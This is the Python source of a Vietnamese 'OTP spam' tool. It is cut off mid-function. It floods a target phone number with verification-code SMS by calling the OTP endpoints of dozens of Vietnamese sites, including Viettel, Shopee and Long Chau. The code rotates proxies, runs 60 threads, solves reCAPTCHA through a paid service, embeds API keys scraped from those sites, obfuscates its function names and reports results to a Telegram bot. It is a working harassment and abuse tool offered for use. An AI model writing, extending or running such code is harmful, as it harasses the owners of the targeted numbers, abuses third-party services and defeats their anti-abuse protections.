# tool_spam_otp_gzii_telegram.py
# Gzii - Smart filter + Delay + KEY + TELEGRAM BOT
# Key mặc định: GziNee
# mod made by Bui Vinh text

import os
import sys
import io
import time
import json
import random
import string
import warnings
import threading
import requests
import concurrent.futures
from threading import BoundedSemaphore
from urllib.parse import urlparse
from datetime import datetime

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings("ignore")

# ============ CẤU HÌNH TELEGRAM ============
TELEGRAM_BOT_TOKEN = "DÁN_TOKEN_BOT_TELEGRAM_VÀO_ĐÂY"
TELEGRAM_ADMIN_ID  = 0   # <-- ID telegram của mày (int), lấy qua @userinfobot

# ============ KEY CỐ ĐỊNH ============
DEFAULT_KEY = "GziNee"          # <-- key mặc định, không đổi
KEY_FILE = "key.json"           # lưu trạng thái đã xác thực

def is_key_verified():
    """Kiểm tra user đã xác thực key chưa (lưu vào file)."""
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            return data.get("key") == DEFAULT_KEY
        except Exception:
            return False
    return False

def save_verified():
    """Lưu trạng thái đã xác thực key."""
    with open(KEY_FILE, "w", encoding="utf-8") as f:
        json.dump({"key": DEFAULT_KEY, "verified_at": datetime.now().isoformat()}, f)

# ============ CẤU HÌNH TOOL ============
MAX_THREADS = 60
PROXY_FILE = "live.txt"
TIMEOUT_LIVE = 8
TIMEOUT_DEAD = 3
RETRY = 1

DELAY_REQ_MIN = 0.0
DELAY_REQ_MAX = 0.0
DELAY_ROUND_MIN = 3
DELAY_ROUND_MAX = 3

CAPTCHA_PROVIDER = "2captcha"
CAPTCHA_API_KEY  = ""

# ============ PROXY ============
def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, "r", encoding="utf-8") as f:
        return [l.strip() for l in f if l.strip() and ":" in l]

PROXIES = load_proxies()
_lock = threading.Lock()
_idx = 0

def get_proxy():
    global _idx
    if not PROXIES:
        return None
    with _lock:
        p = PROXIES[_idx % len(PROXIES)]
        _idx += 1
    return {"http": f"http://{p}", "https": f"http://{p}"}

# ============ HTTP CORE ============
DNS_DEAD_HOSTS = set()
_dns_lock = threading.Lock()

def req(method, url, **kw):
    host = urlparse(url).netloc
    with _dns_lock:
        if host in DNS_DEAD_HOSTS:
            raise requests.exceptions.ConnectionError(f"[DNS-BLACKLISTED] {host}")
    kw.setdefault("timeout", TIMEOUT_LIVE)
    px = get_proxy()
    if px: kw["proxies"] = px
    kw.setdefault("verify", False)
    kw.setdefault("allow_redirects", True)
    for attempt in range(RETRY + 1):
        try:
            return requests.request(method, url, **kw)
        except requests.exceptions.ConnectionError as e:
            if "getaddrinfo failed" in str(e) or "NameResolutionError" in str(e):
                with _dns_lock: DNS_DEAD_HOSTS.add(host)
                raise
            if attempt < RETRY: time.sleep(0.3); continue
            raise
        except (requests.exceptions.Timeout, requests.exceptions.SSLError):
            if attempt < RETRY: time.sleep(0.3); continue
            raise

# ============ CAPTCHA ============
def solve_recaptcha(sitekey, pageurl, invisible=True):
    if not CAPTCHA_API_KEY or not CAPTCHA_PROVIDER:
        return None
    try:
        if CAPTCHA_PROVIDER == "2captcha":
            r = requests.get("http://2captcha.com/in.php", params={
                "key": CAPTCHA_API_KEY, "method": "userrecaptcha",
                "googlekey": sitekey, "pageurl": pageurl,
                "invisible": 1 if invisible else 0, "json": 1,
            }, timeout=15).json()
            if r.get("status") != 1: return None
            job_id = r["request"]
            for _ in range(30):
                time.sleep(5)
                res = requests.get("http://2captcha.com/res.php", params={
                    "key": CAPTCHA_API_KEY, "action": "get", "id": job_id, "json": 1,
                }, timeout=15).json()
                if res.get("status") == 1: return res["request"]
                if res.get("request") != "CAPCHA_NOT_READY": return None
    except Exception:
        return None
    return None

# ============ HELPER ============
last_names = ['Nguyễn','Trần','Lê','Phạm','Võ','Hoàng']
middle_names = ['Vân','Thị','Quang','Hoàng','Anh','Thanh']
first_names = ['Nam','Tuấn','Hương','Linh','Long','Duy']
def rand_name():
    return f"{random.choice(last_names)} {random.choice(middle_names)} {random.choice(first_names)}"
def rand_id(n=32):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))

random_id = rand_id()
formatted_device_id = f"{random_id[:8]}-{random_id[8:12]}-{random_id[12:16]}-{random_id[16:20]}-{random_id[20:]}"
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'

# ============ TELEGRAM SENDER ============
_tg_lock = threading.Lock()

def tg_send(chat_id, text, parse_mode=None):
    """Gửi tin nhắn telegram. Tự chia nếu dài."""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        max_len = 4000
        chunks = [text[i:i+max_len] for i in range(0, len(text), max_len)]
        for chunk in chunks:
            payload = {"chat_id": chat_id, "text": chunk}
            if parse_mode:
                payload["parse_mode"] = parse_mode
            with _tg_lock:
                requests.post(url, json=payload, timeout=15)
    except Exception as e:
        print(f"[TG-ERROR] {e}")

# ============ LOG ============
_current_success = set()
_success_lock = threading.Lock()
_log_buffer = []
_buffer_lock = threading.Lock()
_log_timer = None

def _flush_log():
    global _log_buffer, _log_timer
    with _buffer_lock:
        if not _log_buffer:
            _log_timer = None
            return
        msg = "\n".join(_log_buffer)
        _log_buffer = []
        _log_timer = None
    if TELEGRAM_ADMIN_ID:
        tg_send(TELEGRAM_ADMIN_ID, msg)

def log_line(s):
    global _log_timer
    with _buffer_lock:
        _log_buffer.append(s)
        if _log_timer is None:
            _log_timer = threading.Timer(2.0, _flush_log)
            _log_timer.daemon = True
            _log_timer.start()

def ok(site, fn_name=None):
    log_line(f"✅ {site} đã gửi thành công")
    if fn_name:
        with _success_lock:
            _current_success.add(fn_name)

def fail(site, code=""):
    log_line(f"❌ {site} thất bại {code}")

# ============ CÁC HÀM SPAM ============
# (giữ nguyên toàn bộ — paste y nguyên từ bản trước)

def XWXWWWXWWWXXXXXXWW(sdt):
    try:
        r = req("POST", 'https://www.sapo.vn/fnb/sendotp',
            cookies={'landing_page':'https://www.sapo.vn/','lang':'vi','pageview':'7'},
            headers={'accept':'*/*','content-type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'origin':'https://www.sapo.vn','referer':'https://www.sapo.vn/dang-nhap-kenh-ban-hang.html',
                     'user-agent':UA}, data={'phonenumber': sdt})
        if r.status_code == 200: ok("sapo.vn", "XWXWWWXWWWXXXXXXWW")
        else: fail("sapo.vn", r.status_code)
    except Exception: fail("sapo.vn")

def lIlIlllllllIllIlI(sdt):
    try:
        r = req("POST", 'https://viettel.vn/api/getOTPLoginCommon',
            headers={'Accept':'application/json','Content-Type':'application/json;charset=UTF-8',
                     'Origin':'https://viettel.vn','Referer':'https://viettel.vn/myviettel',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            json={'phone':sdt,'typeCode':'DI_DONG','actionCode':'myviettel://login_mobile','type':'otp_login'})
        if r.status_code == 200: ok("viettel.vn", "lIlIlllllllIllIlI")
        else: fail("viettel.vn", r.status_code)
    except Exception: fail("viettel.vn")

def S2S22SS22SSSSSSSSS2SS(sdt):
    try:
        token = solve_recaptcha("6LdXHxYpAAAAAFmFdXq", "https://medicare.vn/login")
        payload = {'mobile':sdt,'mobile_country_prefix':'84'}
        if token: payload["recaptchaToken"] = token
        r = req("POST", 'https://medicare.vn/api/otp',
            headers={'Accept':'application/json','Content-Type':'application/json',
                     'Origin':'https://medicare.vn','Referer':'https://medicare.vn/login','User-Agent':UA},
            json=payload)
        if r.status_code == 200: ok("medicare.vn", "S2S22SS22SSSSSSSSS2SS")
        else: fail("medicare.vn", r.status_code)
    except Exception: fail("medicare.vn")

def OODOOooDoOOoOoOooDD(sdt):
    try:
        r = req("POST", 'https://tv360.vn/public/v1/auth/get-otp-login',
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://tv360.vn','referer':'https://tv360.vn/login','user-agent':UA},
            json={'msisdn':sdt})
        if r.status_code == 200: ok("tv360.vn", "OODOOooDoOOoOoOooDD")
        else: fail("tv360.vn", r.status_code)
    except Exception: fail("tv360.vn")

def JIILIILJJILJJILJIILLJILI(sdt):
    try:
        r = req("POST", 'https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'Accept':'*/*','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://www.dienmayxanh.com',
                     'Referer':'https://www.dienmayxanh.com/lich-su-mua-hang/dang-nhap',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1'})
        if r.status_code == 200: ok("dienmayxanh.com", "JIILIILJJILJJILJIILLJILI")
        else: fail("dienmayxanh.com", r.status_code)
    except Exception: fail("dienmayxanh.com")

def lIIllIlllIIllIIlIllI(sdt):
    try:
        r = req("POST", 'https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp',
            params={'msisdn':sdt,'languageCode':'vi'},
            headers={'Accept':'application/json','Origin':'https://video.mocha.com.vn',
                     'Referer':'https://video.mocha.com.vn/','User-Agent':UA})
        if r.status_code == 200: ok("mocha.com.vn", "lIIllIlllIIllIIlIllI")
        else: fail("mocha.com.vn", r.status_code)
    except Exception: fail("mocha.com.vn")

def DOOOOoDDDOODDDDoDooO(sdt):
    try:
        r = req("POST", 'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp',
            headers={'accept':'application/json','content-type':'application/json; charset=UTF-8',
                     'origin':'https://fptplay.vn','referer':'https://fptplay.vn/','user-agent':UA,
                     'x-did':'A0EB7FD5EA287DBF'},
            json={'phone':sdt,'country_code':'VN','client_id':'vKyPNd1iWHodQVknxcvZoWz74295wnk8'})
        if r.status_code == 200: ok("fptplay.vn", "DOOOOOoDDDOODDDDoDooO")
        else: fail("fptplay.vn", r.status_code)
    except Exception: fail("fptplay.vn")

def llIllIIIIlIlIIlIlIlll(sdt):
    try:
        r = req("POST", 'https://api.fptplay.net/api/v7.1_w/user/otp/reset_password_otp',
            headers={'accept':'application/json','content-type':'application/json; charset=UTF-8',
                     'origin':'https://fptplay.vn','referer':'https://fptplay.vn/','user-agent':UA,
                     'x-did':'A0EB7FD5EA287DBF'},
            json={'phone':sdt,'country_code':'VN','client_id':'vKyPNd1iWHodQVknxcvZoWz74295wnk8'})
        if r.status_code == 200: ok("fptplay.vn-reset", "llIllIIIIlIlIIlIlIlll")
        else: fail("fptplay.vn-reset", r.status_code)
    except Exception: fail("fptplay.vn-reset")

def NMMNNNMMNMMMMNNNM(sdt):
    try:
        r = req("POST", 'https://api.vieon.vn/backend/user/v2/register',
            params={'platform':'web','ui':'012021'},
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://vieon.vn','referer':'https://vieon.vn/auth/','user-agent':UA},
            json={'username':sdt,'country_code':'VN','model':'Windows 10','device_id':rand_id(32),
                  'device_name':'Edge/127','device_type':'desktop','platform':'web','ui':'012021'})
        if r.status_code == 200: ok("vieon.vn", "NMMNNNMMNMMMMNNNM")
        else: fail("vieon.vn", r.status_code)
    except Exception: fail("vieon.vn")

def GHN_V3(sdt):
    try:
        headers = {
            'accept': 'application/json',
            'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://sso.ghn.vn', 'referer': 'https://sso.ghn.vn/',
            'user-agent': UA, 'x-client-type': 'web',
            'x-device-id': rand_id(32).lower(),
            'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
        }
        r = req("POST", 'https://online-gateway.ghn.vn/sso/public-api/v3/client/auth/start',
                  headers=headers, json={'identifier': sdt, 'identifier_type': 'phone'})
        if r.status_code == 200: ok("ghn.vn-v3", "GHN_V3")
        else: fail("ghn.vn-v3", r.status_code)
    except Exception: fail("ghn.vn-v3")

def MNMNNNMNMNMNNNMMNNMN(sdt):
    try:
        r = req("POST", 'https://www.lottemart.vn/v1/p/mart/bos/vi_bdg/V1/mart-sms/sendotp',
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://www.lottemart.vn','referer':'https://www.lottemart.vn/signup','user-agent':UA},
            json={'username':sdt,'case':'register'})
        if r.status_code == 200: ok("lottemart.vn", "MNMNNNMNMNMNNNMMNNMN")
        else: fail("lottemart.vn", r.status_code)
    except Exception: fail("lottemart.vn")

def Oo0oO0ooooo0O000O0ooO(sdt):
    try:
        r = req("POST", 'https://shopee.vn/api/v4/otp/get_settings_v2',
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://shopee.vn','referer':'https://shopee.vn/buyer/signup','user-agent':UA,
                     'x-api-source':'pc','x-requested-with':'XMLHttpRequest','x-shopee-language':'vi'},
            json={'operation':8,'encrypted_phone':'','phone':sdt,
                  'supported_channels':[1,2,3,6,0,5],'support_session':True})
        if r.status_code == 200 and '"error":0' in r.text: ok("shopee.vn", "Oo0oO0ooooo0O000O0ooO")
        elif r.status_code == 200: fail("shopee.vn", "phone-invalid")
        else: fail("shopee.vn", r.status_code)
    except Exception: fail("shopee.vn")

def LJIJIILJJJLIJLJJILJ(sdt):
    try:
        r = req("POST", 'https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
            headers={'Accept':'*/*','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://www.thegioididong.com',
                     'Referer':'https://www.thegioididong.com/lich-su-mua-hang/dang-nhap',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'phoneNumber':sdt,'isReSend':'false','sendOTPType':'1'})
        if r.status_code == 200: ok("thegioididong.com", "LJIJIILJJJLIJLJJILJ")
        else: fail("thegioididong.com", r.status_code)
    except Exception: fail("thegioididong.com")

def IlIIIlIlllIlIIlIlIllI(sdt):
    try:
        r = req("POST", 'https://papi.fptshop.com.vn/gw/is/user/new-send-verification',
            headers={'accept':'*/*','content-type':'application/json',
                     'apptenantid':'E6770008-4AEA-4EE6-AEDE-691FD22F5C14',
                     'origin':'https://fptshop.com.vn','referer':'https://fptshop.com.vn/',
                     'user-agent':UA,'order-channel':'1'},
            json={'fromSys':'WEBKHICT','otpType':'0','phoneNumber':sdt})
        if r.status_code == 200: ok("fptshop.com.vn", "IlIIIlIlllIlIIlIlIllI")
        else: fail("fptshop.com.vn", r.status_code)
    except Exception: fail("fptshop.com.vn")

def oOOoDDDDoOoDoOoooO(sdt):
    try:
        phone = '+84' + sdt[1:] if sdt.startswith('0') else sdt
        r = req("POST", 'https://www.traveloka.com/api/v2/user/signup',
            headers={'accept':'*/*','content-type':'application/json','origin':'https://www.traveloka.com',
                     'referer':'https://www.traveloka.com/','user-agent':UA,
                     'x-domain':'user','x-route-prefix':'vi-vn'},
            json={'fields':[],'data':{'userLoginMethod':'PN','username':phone},'clientInterface':'desktop'})
        if r.status_code in (200, 202): ok("traveloka.com", "oOOoDDDDoOoDoOoooO")
        else: fail("traveloka.com", r.status_code)
    except Exception: fail("traveloka.com")

def NTTLC_V2(sdt):
    try:
        headers = {
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
            'access-control-allow-origin': '*', 'content-type': 'application/json',
            'order-channel': '1', 'origin': 'https://nhathuoclongchau.com.vn',
            'referer': 'https://nhathuoclongchau.com.vn/', 'user-agent': UA, 'x-channel': 'EStore',
        }
        r = req("POST", 'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
                  headers=headers, json={'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'})
        if r.status_code == 200: ok("nhathuoclongchau.com.vn-v3", "NTTLC_V2")
        else: fail("nhathuoclongchau.com.vn-v3", r.status_code)
    except Exception: fail("nhathuoclongchau.com.vn-v3")

def O00oOoOo0O0Oo0OO00OO0(sdt):
    try:
        r = req("POST", 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification',
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://nhathuoclongchau.com.vn','referer':'https://nhathuoclongchau.com.vn/',
                     'user-agent':UA,'x-channel':'EStore'},
            json={'phoneNumber':sdt,'otpType':1,'fromSys':'WEBKHLC'})
        if r.status_code == 200: ok("nhathuoclongchau.com.vn-v2", "O00oOoOo0O0Oo0OO00OO0")
        else: fail("nhathuoclongchau.com.vn-v2", r.status_code)
    except Exception: fail("nhathuoclongchau.com.vn-v2")

def WWWWWWXWXWXWXXWWW(sdt):
    try:
        r = req("POST", 'https://api.glxplay.io/account/phone/checkPhoneOnly',
            params={'phone':sdt},
            headers={'accept':'*/*','origin':'https://galaxyplay.vn','referer':'https://galaxyplay.vn/',
                     'user-agent':UA,'x-requested-with':'XMLHttpRequest'})
        if r.status_code == 200: ok("galaxyplay.vn", "WWWWWWXWXWXWXXWWW")
        else: fail("galaxyplay.vn", r.status_code)
    except Exception: fail("galaxyplay.vn")

def xxwwwxwwwwxwxwwxxx(sdt):
    try:
        r = req("POST", 'https://api8.viettelpay.vn/customer/v2/accounts/register',
            headers={'User-Agent':'Viettel Money/8.8.8 (com.viettel.viettelpay; build:3; iOS 17.0.2) Alamofire/4.9.1',
                     'Content-Type':'application/json','app-version':'8.8.8','product':'VIETTELPAY',
                     'type-os':'ios','accept-language':'vi','imei':rand_id(36),'device-name':'iPhone',
                     'os-version':'16.0','authority-party':'APP'},
            json={'identityType':'msisdn','identityValue':sdt,'type':'REGISTER'})
        if r.status_code == 200: ok("viettelpay.vn", "xxwwwxwwwwxwxwwxxx")
        else: fail("viettelpay.vn", r.status_code)
    except Exception: fail("viettelpay.vn")

def LJJLIILLLILIJIJLLJL(sdt):
    try:
        phone = '+84' + sdt[1:] if sdt.startswith('0') else sdt
        r = req("POST", 'https://api.gsm-api.net/auth/v1/public/otp/send',
            params={'aud':'user_app','platform':'ios'},
            headers={'User-Agent':'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1',
                     'Content-Type':'application/json','accept-language':'vi','platform':'iOS','aud':'user_app',
                     'app-version-label':'3.15.0','app-build-number':'89'},
            json={'is_forgot_password':False,'phone':phone,'provider':'VIET_GUYS'})
        if r.status_code == 200: ok("xanhsm-sms", "LJJLIILLLILIJIJLLJL")
        else: fail("xanhsm-sms", r.status_code)
    except Exception: fail("xanhsm-sms")

def WXWWWWXWXWXXWWXWWWXWXXXX(sdt):
    try:
        phone = '+84' + sdt[1:] if sdt.startswith('0') else sdt
        r = req("POST", 'https://api.gsm-api.net/auth/v1/public/otp/send',
            params={'platform':'ios','aud':'user_app'},
            headers={'User-Agent':'UserApp/3.15.0 (com.gsm.customer; build:89; iOS 17.0.2) Alamofire/5.9.1',
                     'Content-Type':'application/json','accept-language':'vi','platform':'iOS','aud':'user_app',
                     'app-version-label':'3.15.0','app-build-number':'89'},
            json={'phone':phone,'is_forgot_password':False,'provider':'ZNS_ZALO'})
        if r.status_code == 200: ok("xanhsm-zalo", "WXWWWWXWXWXXWWXWWWXWXXXX")
        else: fail("xanhsm-zalo", r.status_code)
    except Exception: fail("xanhsm-zalo")

def xxwxxxxxxxxwwwxwwwxxxxwx(sdt):
    try:
        r = req("POST", 'https://emartmall.com.vn/index.php?route=account/register/smsRegister',
            headers={'Accept':'application/json','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://emartmall.com.vn',
                     'Referer':'https://emartmall.com.vn/index.php?route=account/register',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'mobile':sdt})
        if r.status_code == 200: ok("emartmall.com.vn", "xxwxxxxxxxxwwwxwwwxxxxwx")
        else: fail("emartmall.com.vn", r.status_code)
    except Exception: fail("emartmall.com.vn")

def DOoODDDDOOoDooOODDODDDO(sdt):
    try:
        r = req("POST", 'https://api.popeyes.vn/api/v1/register',
            headers={'accept':'application/json','content-type':'application/json','origin':'https://popeyes.vn',
                     'referer':'https://popeyes.vn/','user-agent':UA,'x-client':'WebApp'},
            json={'phone':sdt,'firstName':'Nguyễn','lastName':'Ngọc',
                  'email':f'{rand_id(10)}@gmail.com','password':'Abc12345@'})
        if r.status_code == 200: ok("popeyes.vn", "DOoODDDDOOoDooOODDODDDO")
        else: fail("popeyes.vn", r.status_code)
    except Exception: fail("popeyes.vn")

def xwwwwxxxwxwwwxxwxxwxwwx(sdt):
    try:
        r = req("POST", 'https://id.acheckin.vn/api/graphql/v2/mobile',
            headers={'User-Agent':'AppotaHome/29 CFNetwork/1474 Darwin/23.0.0','Content-Type':'application/json',
                     'accept-language':'vi-VN,vi;q=0.9','authorization':'undefined'},
            json={'operationName':'IdCheckPhoneNumber','variables':{'phone_number':sdt},
                  'query':'query IdCheckPhoneNumber($phone_number: String!) { mutation: checkPhoneNumber(phone_number: $phone_number) }'})
        if r.status_code == 200: ok("acheckin.vn", "xwwwwxxxwxwwwxxwxxwxwwx")
        else: fail("acheckin.vn", r.status_code)
    except Exception: fail("acheckin.vn")

def IIIIIIlIIIlIIIIlIllIIIlII(sdt):
    try:
        r = req("POST", 'https://api.gw.ewallet.appota.com/v2/users/register/get_verify_code',
            headers={'User-Agent':'appota_wallet_v2/119 CFNetwork/1474 Darwin/23.0.0',
                     'Content-Type':'application/json','client-version':'5.2.10',
                     'aw-device-id':formatted_device_id,'language':'vi',
                     'client-authorization':'GuVdXWzWPpwsB5EDNYuoJ1Er6OU1aSpP',
                     'x-device-id':formatted_device_id,'x-client-build':'119','x-client-version':'5.2.10',
                     'platform':'ios','accept-language':'vi-vn','x-client-platform':'ios',
                     'ref-client':'appwallet','x-request-ts':str(int(time.time()))},
            json={'phone_number':sdt,'sender':'SMS','ts':int(time.time()),'signature':rand_id(64)})
        if r.status_code == 200: ok("appota.com", "IIIIIIlIIIlIIIIlIllIIIlII")
        else: fail("appota.com", r.status_code)
    except Exception: fail("appota.com")

def O0O0OOoOoO0oOoOOOOoo0oOOO0(sdt):
    try:
        r = req("POST", 'https://api.fmplus.com.vn/api/1.0/auth/verify/send-otp-v2',
            headers={'accept':'application/json','content-type':'application/json','authorization':'Bearer',
                     'origin':'https://fm.com.vn','referer':'https://fm.com.vn/','user-agent':UA,
                     'x-apikey':'X2geZ7rDEDI73K1vqwEGStqGtR90JNJ0K4sQHIrbUI3YISlv',
                     'x-fromweb':'true','x-requestid':rand_id(36)},
            json={'Phone':sdt,'LatOfMap':'106','LongOfMap':'108','Browser':''})
        if r.status_code == 200: ok("fm.com.vn", "O0O0OOoOoO0oOoOOOOoo0oOOO0")
        else: fail("fm.com.vn", r.status_code)
    except Exception: fail("fm.com.vn")

def DOooOoOOOODoODoooDO(sdt):
    try:
        r = req("POST", 'https://tfs-api.hsv-tech.io/client/phone-verification/request-verification',
            headers={'accept':'application/json','content-type':'application/json',
                     'key':'c3ef5fcbab3e7ebd82794a39da791ff6','origin':'https://thefaceshop.com.vn',
                     'referer':'https://thefaceshop.com.vn/','user-agent':UA,
                     'timestamp':str(int(time.time()*1000))},
            json={'phoneNumber':sdt})
        if r.status_code == 200: ok("thefaceshop.com.vn", "DOooOoOOOODoODoooDO")
        else: fail("thefaceshop.com.vn", r.status_code)
    except Exception: fail("thefaceshop.com.vn")

def S22SSS2SSSS22222SSS22(sdt):
    try:
        r = req("POST", 'https://beautybox-api.hsv-tech.io/client/phone-verification/request-verification',
            headers={'accept':'application/json','content-type':'application/json',
                     'key':'ac41e98f028aa44aac947da26ceb7cff','origin':'https://beautybox.com.vn',
                     'referer':'https://beautybox.com.vn/','user-agent':UA,
                     'timestamp':str(int(time.time()*1000))},
            json={'phoneNumber':sdt})
        if r.status_code == 200: ok("beautybox.com.vn", "S22SSS2SSSS22222SSS22")
        else: fail("beautybox.com.vn", r.status_code)
    except Exception: fail("beautybox.com.vn")

def IIIIllllIllIIIIllIIIllI(sdt):
    try:
        r = req("POST", 'https://api-crownx.winmart.vn/iam/api/v1/user/register',
            headers={'accept':'application/json','content-type':'application/json',
                     'authorization':'Bearer undefined','origin':'https://winmart.vn',
                     'referer':'https://winmart.vn/','user-agent':UA,'x-api-merchant':'WCM'},
            json={'firstName':rand_name(),'phoneNumber':sdt,'masanReferralCode':'',
                  'dobDate':'2000-02-05','gender':'Male'})
        if r.status_code == 200: ok("winmart.vn-v2", "IIIIllllIllIIIIllIIIllI")
        else: fail("winmart.vn-v2", r.status_code)
    except Exception: fail("winmart.vn-v2")

def mmnmmmnmmmmmmmnmmnnmnnmm(sdt):
    try:
        r = req("POST", 'https://medicare.vn/api/otp',
            headers={'Accept':'application/json','Content-Type':'application/json',
                     'Origin':'https://medicare.vn','Referer':'https://medicare.vn/login','User-Agent':UA},
            json={'mobile':sdt,'mobile_country_prefix':'84'})
        if r.status_code == 200: ok("medicare.vn-v2", "mmnmmmnmmmmmmmnmmnnmnnmm")
        else: fail("medicare.vn-v2", r.status_code)
    except Exception: fail("medicare.vn-v2")

def IIllIllIlllIlllII(sdt):
    try:
        r = req("POST", 'https://api.vato.vn/api/authenticate/request_code',
            headers={'accept':'application/json','content-type':'application/json',
                     'origin':'https://futabus.vn','referer':'https://futabus.vn/','user-agent':UA,
                     'x-app-id':'client'},
            json={'phoneNumber':sdt,'deviceId':rand_id(36),'use_for':'LOGIN'})
        if r.status_code == 200: ok("futabus.vn", "IIllIllIlllIlllII")
        else: fail("futabus.vn", r.status_code)
    except Exception: fail("futabus.vn")

def mmnnmnmnnmmmnnmnmmmmm(sdt):
    try:
        r = req("POST", 'https://id.viettelpost.vn/Account/SendOTPByPhone',
            headers={'Accept':'text/html','Content-Type':'application/x-www-form-urlencoded',
                     'Origin':'null','User-Agent':UA},
            data={'FormRegister.FullName':rand_name(),'FormRegister.Phone':sdt,
                  'FormRegister.Password':'Abc12345@','FormRegister.ConfirmPassword':'Abc12345@',
                  'ConfirmOtpType':'Register','FormRegister.IsRegisterFromPhone':'true'})
        if r.status_code == 200: ok("viettelpost.vn", "mmnnmnmnnmmmnnmnmmmmm")
        else: fail("viettelpost.vn", r.status_code)
    except Exception: fail("viettelpost.vn")

def lIIlllIIIllIIIlIIIIIll(sdt):
    try:
        r = req("POST", 'https://viettel.vn/api/get-otp-contract-mobile',
            headers={'Accept':'application/json','Content-Type':'application/json;charset=UTF-8',
                     'Origin':'https://viettel.vn','Referer':'https://viettel.vn/myviettel',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            json={'msisdn':sdt,'type':'register'})
        if r.status_code == 200: ok("viettel.vn-contract", "lIIlllIIIllIIIlIIIIIll")
        else: fail("viettel.vn-contract", r.status_code)
    except Exception: fail("viettel.vn-contract")

def jijjlljjjijjiiijjiilii(sdt):
    try:
        r = req("POST", 'https://viettel.vn/api/get-otp',
            headers={'Accept':'application/json','Content-Type':'application/json;charset=UTF-8',
                     'Origin':'https://viettel.vn','Referer':'https://viettel.vn/dang-ky',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            json={'msisdn':sdt})
        if r.status_code == 200: ok("viettel.vn-register", "jijjlljjjijjiiijjiilii")
        else: fail("viettel.vn-register", r.status_code)
    except Exception: fail("viettel.vn-register")

def IJIILJILJLLLJJLLJLJILII(sdt):
    try:
        r = req("POST", 'https://www.cathaylife.com.vn/CPWeb/servlet/HttpDispatcher/CPZ1_0110/reSendOTP',
            headers={'Accept':'application/json',
                     'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8',
                     'Origin':'https://www.cathaylife.com.vn',
                     'Referer':'https://www.cathaylife.com.vn/CPWeb/html/CP/Z1/CPZ1_0100/CPZ10110.html',
                     'User-Agent':UA,'X-Requested-With':'XMLHttpRequest'},
            data={'memberMap':json.dumps({'phone':sdt,'email':f'{rand_id(10)}@gmail.com',
                                          'password':'Abc12345@','birthday':'03/07/2001',
                                          'certificateNumber':rand_id(12),'CUSTOMER_NAME':rand_name(),
                                          'LINK_FROM':'signUp2','memberID':''}),
                  'OTP_TYPE':'P','LANGS':'vi_VN'})
        if r.status_code == 200: ok("cathaylife.com.vn", "IJIILJILJLLLJJLLJLJILII")
        else: fail("cathaylife.com.vn", r.status_code)
    except Exception: fail("cathaylife.com.vn")

def mmnmnnmnnnmmmnmmmnmnnmm(sdt):
    try:
        r = req("POST", 'https://new.vinamilk.com.vn/api/account/getotp',
            headers={'accept':'*/*','content-type':'text/plain;charset=UTF-8',
                     'authorization':'Bearer null','origin':'https://new.vinamilk.com.vn',
                     'referer':'https://new.vinamilk.com.vn/account/register','user-agent':UA},
            data=f'{{"type":"register","phone":"{sdt}"}}')
        if r.status_code == 200: ok("vinamilk.com.vn", "mmnmnnmnnnmmmnmmmnmnnmm")
        else: fail("vinamilk.com.vn", r.status_code)
    except Exception: fail("vinamilk.com.vn")

def WXXXXWXWWWXWWWXXWXWXXXXXX(sdt):
    try:
        r = req("POST", 'https://api-omni.mutosi.com/client/auth/register',
            headers={'Accept':'application/json','Content-Type':'application/json',
                     'Origin':'https://mutosi.com','Referer':'https://mutosi.com/','User-Agent':UA},
            json={'name':rand_name(),'phone':sdt,'password':'Abc12345@',
                  'confirm_password':'Abc12345@','verify_otp':0,
                  'email':f'{rand_id(10)}@gmail.com','birthday':'2006-02-13',
                  'accept_the_terms':1,'receive_promotion':1})
        if r.status_code == 200: ok("mutosi.com", "WXXXXWXWWWXWWWXXWXWXXXXXX")
        else: fail("mutosi.com", r.status_code)
    except Exception: fail("mutosi.com")

def MMNMMNMMMNNMNNNMNNN(sdt):
    try:
